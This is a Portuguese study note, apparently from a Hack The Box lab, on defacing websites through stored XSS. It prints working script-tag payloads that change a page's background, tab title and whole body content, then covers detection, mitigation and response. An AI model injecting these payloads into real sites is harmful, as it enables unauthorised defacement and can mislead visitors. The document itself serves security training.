# Defacement por meio de XSS

## O que é

Defacement é a alteração não autorizada da aparência ou do conteúdo visível de um site. Com XSS, o atacante não precisa necessariamente modificar os arquivos originais no servidor: o JavaScript injetado pode manipular o DOM quando a página é carregada.

Stored XSS é especialmente relevante nesse cenário porque o payload fica persistido no back-end e pode ser entregue automaticamente a todos que acessarem o conteúdo afetado.

## Como funciona

O fluxo apresentado no laboratório é:

1. um payload JavaScript é inserido na To-Do List vulnerável;
2. a aplicação armazena a entrada sem tratamento adequado;
3. o payload é recuperado em visitas posteriores;
4. o navegador o executa e modifica a apresentação da página;
5. todos os visitantes visualizam o conteúdo alterado.

O HTML original pode continuar intacto. A aparência muda porque o JavaScript altera propriedades e elementos do DOM depois que o navegador carrega a página.

## Elementos manipulados

| Objetivo | API utilizada |
| --- | --- |
| Alterar a cor de fundo | `document.body.style.background` |
| Definir uma imagem de fundo | `document.body.background` |
| Alterar o título da aba | `document.title` |
| Substituir conteúdo HTML | `innerHTML` |

## Alteração do fundo

Payload original para definir a cor usada pelo Hack The Box:

```html
<script>document.body.style.background = "#141d2b"</script>
```

<a href="../xss12.png">
  <img src="../xss12.png" alt="Cor de fundo da aplicação alterada por um payload Stored XSS">
</a>

A propriedade também aceita cores nomeadas, como `black`, ou outros valores CSS válidos.

O material apresenta ainda uma imagem externa como fundo:

```html
<script>document.body.background = "https://www.hackthebox.eu/images/logo-htb.svg"</script>
```

## Alteração do título

O título exibido na aba do navegador pode ser alterado com:

```html
<script>document.title = 'HackTheBox Academy'</script>
```

<a href="../xss13.png">
  <img src="../xss13.png" alt="Título da aba alterado pelo payload XSS">
</a>

Essa modificação pode reforçar a aparência falsa ou substituir elementos de identidade visual da aplicação.

## Alteração do conteúdo

Para substituir somente um elemento específico:

```javascript
document.getElementById("todo").innerHTML = "New Text"
```

Com jQuery carregado na página, o equivalente apresentado é:

```javascript
$("#todo").html('New Text');
```

Para substituir todo o conteúdo do primeiro elemento `body`:

```javascript
document.getElementsByTagName('body')[0].innerHTML = "New Text"
```

O índice `[0]` seleciona o primeiro elemento retornado por `getElementsByTagName('body')`.

## HTML usado no exercício

Antes de construir o payload final, o material recomenda testar separadamente o HTML que será inserido:

```html
<center>
    <h1 style="color: white">Cyber Security Training</h1>
    <p style="color: white">by 
        <img src="https://academy.hackthebox.com/images/logo-htb.svg" height="25px" alt="HTB Academy">
    </p>
</center>
```

Payload final, preservado do material:

```html
<script>document.getElementsByTagName('body')[0].innerHTML = '<center><h1 style="color: white">Cyber Security Training</h1><p style="color: white">by <img src="https://academy.hackthebox.com/images/logo-htb.svg" height="25px" alt="HTB Academy"> </p></center>'</script>
```

<a href="../xss14.png">
  <img src="../xss14.png" alt="Resultado final do defacement realizado no laboratório">
</a>

## Por que o código original permanece

O payload modifica o DOM em tempo de execução. Ao inspecionar o código entregue pela aplicação, os elementos originais e os payloads armazenados ainda podem estar presentes:

```html
<div></div><ul class="list-unstyled" id="todo"><ul>
<script>document.body.style.background = "#141d2b"</script>
</ul><ul><script>document.title = 'HackTheBox Academy'</script>
</ul><ul><script>document.getElementsByTagName('body')[0].innerHTML = '...SNIP...'</script>
</ul></ul>
```

A ordem de execução importa. Caso outros scripts sejam executados depois do payload, eles podem sobrescrever parte das alterações ou reconstruir elementos removidos.

## Impacto

- dano à reputação e à confiança dos usuários;
- disseminação de mensagens falsas sob um domínio legítimo;
- substituição da interface por páginas de phishing;
- indisponibilidade funcional da interface para usuários;
- impacto operacional, financeiro e de resposta a incidentes.

O defacement visível pode ser apenas uma demonstração. A mesma capacidade de executar JavaScript pode permitir ações mais graves, dependendo da sessão da vítima e dos dados acessíveis na página.

## Como identificar

- Procure entradas persistentes exibidas a vários usuários.
- Verifique se dados armazenados chegam ao DOM sem codificação contextual.
- Inspecione o HTML recebido e o DOM após a execução dos scripts.
- Analise alterações inesperadas em `document.title`, estilos e `innerHTML`.
- Examine o banco de dados ou a fonte persistente para localizar payloads já armazenados.

## Mitigação e resposta

- Aplicar codificação de saída apropriada ao contexto.
- Para texto, preferir `textContent` a `innerHTML`.
- Sanitizar conteúdo quando a aplicação realmente precisar aceitar HTML.
- Manter o escape automático oferecido pelo framework.
- Adotar Content Security Policy (CSP) como camada adicional.
- Corrigir o ponto de inserção e remover payloads já persistidos.
- Invalidar sessões e investigar outras ações caso haja evidência de exploração.
- Revisar logs para determinar quando o payload foi inserido e quais usuários acessaram a página afetada.

## Pontos-chave para revisão

- Stored XSS torna o defacement persistente para diferentes visitantes.
- O JavaScript pode mudar a aparência sem alterar os arquivos originais do site.
- Propriedades como `document.title` e `innerHTML` permitem alterações amplas no DOM.
- Corrigir somente o código não remove necessariamente payloads armazenados.
- Em testes, execute esses payloads exclusivamente em laboratórios ou sistemas autorizados.
